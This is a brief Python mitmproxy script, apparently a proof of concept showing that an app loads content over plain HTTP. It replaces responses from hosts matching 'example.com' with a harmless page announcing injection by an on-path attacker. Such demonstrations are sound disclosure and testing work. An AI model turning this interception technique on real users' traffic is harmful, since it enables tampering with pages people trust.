from mitmproxy import http


POC_HTML = b"""<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>POC: MITM Content Injection</title>
  </head>
  <body style="font-family:sans-serif;text-align:center;margin-top:80px">
    <h1>POC: MITM Content Injection</h1>
    <p>This page was modified by an on-path attacker.</p>
    <p>The app loaded HTTP content without transport protection.</p>
  </body>
</html>
"""


def response(flow: http.HTTPFlow):
    if "example.com" in flow.request.pretty_host:
        flow.response = http.Response.make(
            200,
            POC_HTML,
            {"Content-Type": "text/html; charset=utf-8"},
        )
